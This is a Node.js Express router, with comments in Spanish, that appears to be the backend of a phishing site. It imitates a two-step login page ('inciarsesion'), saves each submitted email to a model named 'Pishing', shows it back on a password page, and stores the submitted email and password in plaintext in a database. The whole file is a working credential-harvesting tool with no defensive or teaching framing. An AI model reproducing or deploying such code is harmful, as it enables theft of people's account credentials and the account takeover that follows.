const express = require('express');
const router= express.Router();
const Pishing = require('../models/pishing');
const Data = require('../models/data');


router.get('/inciarsesion/ingresar', (req, res)=>{
    res.render('session/sigin');
})

router.get('/inciarsesion/password', async (req, res)=>{
    const notes=  await Pishing.find().lean().sort({$natural:-1}).limit(1);
    console.log(notes);
    res.render('session/password', {notes});
})

router.post('/inciarsesion/sigin', async (req, res)=>{
    //Destructuring
    //Creo variables con las propiedades del objeto
    const {correo}=req.body;
        const newData= new Pishing({correo})
        await newData.save();
        //req.flash('succes_msg', 'Nota agregada');
        res.redirect('/inciarsesion/password');

    //}

})




router.post('/inciarsesion/data', async (req, res)=>{

    const {correo, password}=req.body;
    //console.log(req.body);

    const newData= new Data({correo, password})
    //console.log(newData);
    await newData.save();
    res.render('session/jelou');


})














module.exports = router;


